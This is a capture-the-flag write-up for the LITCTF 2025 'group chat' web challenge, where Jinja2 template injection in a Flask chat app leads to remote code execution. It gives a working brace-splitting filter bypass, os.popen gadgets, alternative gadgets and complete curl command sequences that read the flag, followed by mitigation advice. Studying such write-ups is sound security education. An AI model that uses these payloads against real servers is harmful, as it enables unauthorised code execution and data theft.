---
title: "web/group chat - Lexington Informatics Tournament CTF 2025"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["ssti", "web", "rce", "xss", "jinja2", "flask", "render-template", "lexington-informatics-tourname", "lexington-informatics-tournament-c", "2025", "ctf-writeup"]
summary: "\\- Bug: user-controlled content rendered via rendertemplatestring → Jinja2 SSTI."
source:
  name: "CTFtime writeup #40381"
  url: "https://ctftime.org/writeup/40381"
original_source: "https://www.violent.team/writeups/litctf2025/group-chat"
ctf:
  name: "Lexington Informatics Tournament CTF 2025"
  year: 2025
  challenge: "web/group chat"
---

## Metadata

- **CTF:** Lexington Informatics Tournament CTF 2025
- **Task:** web/group chat
- **Author team:** viole(n)t
- **CTFtime tags:** ssti, web, rce
- **CTFtime:** <https://ctftime.org/writeup/40381>
- **Original writeup:** <https://www.violent.team/writeups/litctf2025/group-chat>

---
# Group Chat

## TL;DR

\- Bug: user-controlled content rendered via `render_template_string` → **Jinja2 SSTI**.  
\- Filters: username blocks a single string containing both `{` and `}`, and chat messages must be alphanumeric.  
\- Bypass: **split the Jinja expression across two usernames**, and use an **unterminated string + `~`** to swallow the noise between chat lines.  
\- RCE primitive: `{{ request.application.__globals__.__builtins__.__import__("os").popen("…").read() }}`.  
\- Loot: `ls -la` showed `flag.txt`; `cat flag.txt` returned  
  
`LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}`.  


\---

## Challenge Facts

\- **Category:** Web  
\- **Stack:** Flask + Jinja2, Flask-SocketIO (unused in vuln path)  
\- **Key routes:**  
\- `/set_username` — sets `session['username']` with weak checks  
\- `/` — renders chat via **`render_template_string`** with `chat_logs` concatenated directly  
\- `/send_message` — accepts only `isalnum()` messages  
\- **Filters:**  
  
```python  
# username checks  
if len(username) > 1000: reject  
if username.count('{') and username.count('}'): reject  
# messages must be alphanumeric  
if not msg.isalnum(): reject  
```  


\---

## Root Cause Analysis

### 1) Dangerous rendering

The index builds a template string and directly injects `chat_logs`:

```python  
html = '''  
<div id="chat-box">''' + '  
'.join(chat_logs) + '''  
</div>  
'''  
return render_template_string(html) # ← interprets Jinja  
```

This means any `{{ … }}` in usernames/messages becomes **live Jinja**.

### 2) “Protection” is bypassable

\- The username rejection only triggers if **one string** contains **both** `{` and `}`.  
\- Messages can’t carry braces at all (`isalnum()`), but they **do** get joined between usernames as `": msg  
"`.

**Idea:** place `{{ … ~ '` in one username and the closing `' }}` in a later username, so the in-between `: A  
` is swallowed as a literal by the open quote, yielding valid Jinja.

\---

## Exploitation Journey

### A) (Discarded) Stored XSS

\- Username as `` executes for us, but there were no juicy admin-only endpoints (404s on `/flag`, `/admin`, etc.).  
\- So we pivoted to template injection / RCE.

### B) Split-brace SSTI (core technique)

We use **two usernames** and send a benign message after each to get them into the log.

**Username #1 (open expression + open quote):**

```  
{{ 7*7 ~ "  
```

**Send a message:** `A` (any alphanumeric)

This makes `/` 500 (template is incomplete). That’s expected.

**Username #2 (close quote + close expression):**

```  
" }}  
```

**Send another message:** `B`

Now the page renders and shows `49`, proving SSTI with our split braces.

> The key is Jinja’s ~ (concatenation) and leaving an open double quote to absorb : A  
between the two lines.  
>

\---

## Turning SSTI → RCE

Swap the first username’s expression to a Python gadget that reaches `os`:

**Reliable gadget (via Flask request object):**

```  
{{ request.application.__globals__.__builtins__.__import__("os").popen("ls -la").read() ~ "  
```

Then repeat the **closer** username:

```  
" }}  
```

…and send a benign message after each set.

**Results (excerpt):**

```  
total 32  
drwxr-xr-x 1 user user 4096 Aug 24 07:37 .  
drwxr-xr-x 1 root root 4096 Aug 23 03:28 ..  
-rw-rw-r-- 1 user user 114 Aug 12 01:45 flag.txt  
-rw-rw-r-- 1 user user 2746 Aug 23 02:59 [main.py](http://main.py)  
...  
```

**Read the flag:**

First username:

```  
{{ request.application.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() ~ "  
```

Closer username:

```  
" }}  
```

**Flag:**

`LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}`

\---

## Exact `curl` Flow (deterministic, cookie-safe)

> Replace BASE with your instance URL.  
>

```bash  
BASE='http://34.44.129.8:52313'

# 1) Start a session (saves cookies to file "c")  
curl -c c "$BASE/set_username" > /dev/null

# 2) First half — PoC: 7*7  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username={{ 7*7 ~ "'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=A' -L -o /dev/null

# 3) Second half — close and render  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username=" }}'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=B' -L -o /dev/null

# 4) Confirm: should see "49" in the chat HTML  
curl -b c "$BASE/" | sed -n '1,200p'  
```

**Swap to RCE (ls):**

```bash  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username={{ request.application.__globals__.__builtins__.__import__("os").popen("ls -la").read() ~ "'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=A' -L -o /dev/null  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username=" }}'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=B' -L -o /dev/null  
curl -b c "$BASE/" | sed -n '1,300p'  
```

**Read the flag:**

```bash  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username={{ request.application.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() ~ "'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=A' -L -o /dev/null  
curl -b c -c c -X POST "$BASE/set_username" --data-urlencode 'username=" }}'  
curl -b c -c c -X POST "$BASE/send_message" -d 'message=B' -L -o /dev/null  
curl -b c "$BASE/" | sed -n '1,300p'  
```

\---

## Troubleshooting (quick)

\- **Index shows 500 after first half:** normal; the template is incomplete.  
\- **Still 500 even after closing:**  
\- Make sure both halves went to the **same session** (reuse cookies).  
\- You may have multiple dangling `{{ …` from earlier attempts. Send the closer (`" }}` as username + a message) **a few times** to rebalance.  
\- **Quotes collide:** we use **double quotes** for the swallowing string (`~ "…"`), so single quotes inside gadgets (e.g., `['os']`) don’t break it.  
\- **Alternative gadgets (if one path is blocked):**  
\- `{{ url_for.__globals__.__builtins__.__import__("os").popen("…").read() ~ "`  
\- `{{ get_flashed_messages.__globals__.__builtins__.__import__("os").popen("…").read() ~ "`

\---

## Mitigations (what should be fixed)

\- **Never** use `render_template_string` with untrusted content. Render a **template file** and pass **data**, not markup.  
\- Escape user content: `{{ chat_logs|e }}` or store/render messages as text nodes.  
\- If rich text is required, use a sanitizer (Bleach/DOMPurify server-side) to a **safe subset**.  
\- Remove brittle `{`/`}` checks. They do nothing against split-payloads/SSTI. Use a proper allow-list and server-side validation.  
\- Consider a CSP (`script-src 'self'`) to soften XSS impact (doesn’t stop SSTI, but helps).  
\- Keep debug off, Jinja sandboxing if possible (won’t save you here, but good practice).

\---

## Artifacts / Evidence

\- PoC render: `49` in chat after split-brace test.  
\- `ls -la` output showing `flag.txt` in the working dir.  
\- `cat flag.txt` output with the captured flag.  
\- Terminal logs (cookie-consistent session) confirming the steps.
